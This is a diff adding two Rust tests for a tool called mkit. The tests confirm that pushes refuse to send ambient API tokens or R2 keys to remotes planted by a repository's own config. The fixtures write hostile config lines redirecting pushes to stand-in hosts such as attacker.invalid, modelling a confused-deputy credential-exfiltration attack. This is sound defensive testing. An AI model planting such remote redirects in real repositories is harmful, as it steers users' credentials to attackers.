@@ -231,3 +231,69 @@ fn named_repo_remote_with_token_is_still_gated() {
         "expected credential refusal for named repo remote: {stderr}"
     );
 }
+
+/// Most faithful confused-deputy shape: a hostile clone plants BOTH a
+/// malicious named remote AND a per-branch upstream pointing at it, so a
+/// victim running a *bare* `mkit push` (no explicit remote argument)
+/// would otherwise be steered at the attacker endpoint with ambient
+/// credentials. The per-endpoint gate must still fire — trust is keyed
+/// on the resolved endpoint, never the (repo-supplied) upstream name.
+#[test]
+fn bare_push_to_repo_planted_upstream_is_still_gated() {
+    let td = repo_with_commit(b"hi");
+    // Repo-scoped config: named HTTP remote + branch upstream redirect.
+    let cfg = "remote.evil.url = mkit+https://attacker.invalid/repo\n\
+               remote.evil.type = http\n\
+               branch.main.remote = evil\n\
+               branch.main.merge = main\n";
+    fs::write(td.path().join(".mkit/config"), cfg).unwrap();
+
+    let xdg = tempfile::tempdir().unwrap();
+    let out = Command::new(mkit_bin())
+        .args(["push"]) // bare push -> resolves the repo-planted upstream
+        .current_dir(td.path())
+        .env("XDG_CONFIG_HOME", xdg.path())
+        .env("MKIT_API_TOKEN", "secret")
+        .output()
+        .expect("spawn mkit");
+    drop(xdg);
+    assert!(
+        !out.status.success(),
+        "bare push to repo-planted upstream must be refused"
+    );
+    let stderr = String::from_utf8(out.stderr).unwrap();
+    assert!(
+        stderr.contains("refusing repo-configured remote"),
+        "expected credential refusal for repo-planted upstream: {stderr}"
+    );
+}
+
+/// S3 sibling of the named-remote gate: a hostile repo-scoped named S3
+/// remote with ambient R2 credentials present must also be refused.
+#[test]
+fn named_repo_s3_remote_with_creds_is_still_gated() {
+    let td = repo_with_commit(b"hi");
+    let cfg = "remote.evil.url = mkit+s3://r2.attacker.invalid/bucket/proj\n\
+               remote.evil.type = s3\n";
+    fs::write(td.path().join(".mkit/config"), cfg).unwrap();
+
+    let xdg = tempfile::tempdir().unwrap();
+    let out = Command::new(mkit_bin())
+        .args(["push", "evil"])
+        .current_dir(td.path())
+        .env("XDG_CONFIG_HOME", xdg.path())
+        .env("MKIT_R2_ACCESS_KEY_ID", "test-key")
+        .env("MKIT_R2_SECRET_ACCESS_KEY", "test-secret")
+        .output()
+        .expect("spawn mkit");
+    drop(xdg);
+    assert!(
+        !out.status.success(),
+        "hostile named S3 remote must be refused"
+    );
+    let stderr = String::from_utf8(out.stderr).unwrap();
+    assert!(
+        stderr.contains("refusing repo-configured remote"),
+        "expected credential refusal for named S3 repo remote: {stderr}"
+    );
+}
